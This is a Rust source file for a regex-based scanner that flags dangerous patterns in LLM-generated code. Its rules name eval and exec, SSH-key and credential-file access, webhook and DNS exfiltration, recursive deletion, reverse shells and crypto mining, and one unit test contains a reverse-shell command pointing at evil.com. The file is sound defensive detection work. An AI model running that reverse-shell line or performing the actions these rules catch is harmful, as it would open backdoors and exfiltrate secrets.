//! Embedded pattern scanner — line-based vulnerability detection rules.
//!
//! This is the base scanner that the Shadow's StaticAnalyzer extends with
//! its own domain-specific rules. It operates on content strings rather
//! than files, making it suitable for scanning LLM output.

use serde::Serialize;

/// Severity level for scan findings.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Warn,
    Critical,
}

/// A single finding from the scanner.
#[derive(Debug, Clone, Serialize)]
pub struct ScanFinding {
    pub rule_id: String,
    pub severity: Severity,
    pub file: String,
    pub line: usize,
    pub message: String,
    pub evidence: String,
}

struct LineRule {
    id: &'static str,
    severity: Severity,
    pattern: &'static str,
    message: &'static str,
}

const LINE_RULES: &[LineRule] = &[
    // Code injection
    LineRule {
        id: "dangerous-eval", severity: Severity::Critical,
        pattern: r"\beval\s*\(",
        message: "eval() can execute arbitrary code — high risk of code injection",
    },
    LineRule {
        id: "dangerous-function-constructor", severity: Severity::Critical,
        pattern: r"\bnew\s+Function\s*\(",
        message: "new Function() is equivalent to eval — code injection risk",
    },
    LineRule {
        id: "dangerous-exec", severity: Severity::Critical,
        pattern: r"\bexec\s*\(",
        message: "exec() spawns system commands — potential remote code execution",
    },
    LineRule {
        id: "dangerous-exec-sync", severity: Severity::Critical,
        pattern: r"\bexecSync\s*\(",
        message: "execSync() spawns system commands synchronously — RCE risk",
    },
    LineRule {
        id: "dangerous-spawn", severity: Severity::Warn,
        pattern: r"\bspawn\s*\(",
        message: "spawn() creates child processes — review command arguments",
    },
    LineRule {
        id: "dangerous-child-process", severity: Severity::Warn,
        pattern: r"child_process",
        message: "child_process module can execute arbitrary system commands",
    },
    // Credential/secret theft
    LineRule {
        id: "keychain-access", severity: Severity::Critical,
        pattern: r"(keychain|keytar|security-framework|credential.store)",
        message: "Accesses system credential store — potential secret theft",
    },
    LineRule {
        id: "ssh-key-access", severity: Severity::Critical,
        pattern: r"\.ssh/(id_rsa|id_ed25519|id_ecdsa|authorized_keys)",
        message: "Accesses SSH keys — potential credential exfiltration",
    },
    LineRule {
        id: "password-harvest", severity: Severity::Critical,
        pattern: r"(passwords?\.json|credentials?\.json|\.env\.local|\.env\.prod)",
        message: "References credential/password files — data theft risk",
    },
    // Network exfiltration
    LineRule {
        id: "webhook-exfil", severity: Severity::Critical,
        pattern: r"(webhook|discord\.com/api/webhooks|hooks\.slack\.com)",
        message: "Sends data to webhooks — potential exfiltration channel",
    },
    LineRule {
        id: "dns-exfil", severity: Severity::Critical,
        pattern: r"\bdns\.(resolve|lookup|query)\b",
        message: "DNS operations could be used for data exfiltration",
    },
    // Destructive
    LineRule {
        id: "recursive-delete", severity: Severity::Critical,
        pattern: r"(rm\s+-rf|rimraf|fs\.rm.*recursive|shutil\.rmtree)",
        message: "Recursive deletion — could destroy data",
    },
    LineRule {
        id: "sensitive-path-access", severity: Severity::Critical,
        pattern: r"(/etc/passwd|/etc/shadow|/etc/sudoers|/private/etc)",
        message: "Accesses sensitive system files",
    },
    // Obfuscation
    LineRule {
        id: "base64-decode-exec", severity: Severity::Critical,
        pattern: r"(atob|Buffer\.from|base64\.b64decode|base64 -d).*\b(eval|exec|spawn|Function)\b",
        message: "Decodes base64 then executes — classic obfuscation technique",
    },
    LineRule {
        id: "hex-encoded-strings", severity: Severity::Warn,
        pattern: r"\\x[0-9a-fA-F]{2}(\\x[0-9a-fA-F]{2}){5,}",
        message: "Long hex-encoded string — possible obfuscated payload",
    },
    LineRule {
        id: "char-code-obfuscation", severity: Severity::Warn,
        pattern: r"String\.fromCharCode\s*\(.*,.*,.*,",
        message: "String.fromCharCode with many args — possible obfuscation",
    },
    // Permission escalation
    LineRule {
        id: "sudo-usage", severity: Severity::Critical,
        pattern: r"\bsudo\b",
        message: "Uses sudo — potential privilege escalation",
    },
    LineRule {
        id: "chmod-permissive", severity: Severity::Warn,
        pattern: r"chmod\s+(777|666|a\+rwx)",
        message: "Sets overly permissive file permissions",
    },
    // Crypto mining
    LineRule {
        id: "crypto-mining", severity: Severity::Critical,
        pattern: r"(stratum\+tcp|xmrig|coinhive|cryptonight|minerd|hashrate)",
        message: "Cryptocurrency mining indicators detected",
    },
    // Reverse shell
    LineRule {
        id: "reverse-shell", severity: Severity::Critical,
        pattern: r"(\/dev\/tcp|nc\s+-e|ncat\s+-e|bash\s+-i\s+>&|mkfifo.*/tmp/)",
        message: "Reverse shell pattern detected — backdoor risk",
    },
    // Data exfiltration
    LineRule {
        id: "curl-post-data", severity: Severity::Critical,
        pattern: r"curl\s+.*(-d|--data|--data-binary)\s+.*(@/|@~|\$)",
        message: "curl POSTing file contents — data exfiltration",
    },
];

/// Scan content and return findings.
pub fn scan_content(filename: &str, content: &str) -> Vec<ScanFinding> {
    let mut findings = Vec::new();

    for (line_num, line) in content.lines().enumerate() {
        let trimmed = line.trim();

        // Skip comments
        if trimmed.starts_with("//") || trimmed.starts_with('#') || trimmed.starts_with("--") {
            continue;
        }

        for rule in LINE_RULES {
            if let Ok(re) = regex::Regex::new(rule.pattern) {
                if re.is_match(line) {
                    findings.push(ScanFinding {
                        rule_id: rule.id.to_string(),
                        severity: rule.severity,
                        file: filename.to_string(),
                        line: line_num + 1,
                        message: rule.message.to_string(),
                        evidence: truncate_evidence(line),
                    });
                }
            }
        }
    }

    findings
}

fn truncate_evidence(line: &str) -> String {
    let trimmed = line.trim();
    if trimmed.len() > 120 {
        format!("{}...", &trimmed[..120])
    } else {
        trimmed.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detects_eval() {
        let findings = scan_content("test.js", "const x = eval(userInput);");
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "dangerous-eval");
    }

    #[test]
    fn test_clean_code() {
        let findings = scan_content("clean.js", "console.log('hello');");
        assert!(findings.is_empty());
    }

    #[test]
    fn test_skips_comments() {
        let findings = scan_content("test.js", "// eval('comment')");
        assert!(findings.is_empty());
    }

    #[test]
    fn test_detects_reverse_shell() {
        let findings = scan_content("test.sh", "bash -i >& /dev/tcp/evil.com/4444 0>&1");
        assert!(findings.iter().any(|f| f.rule_id == "reverse-shell"));
    }
}
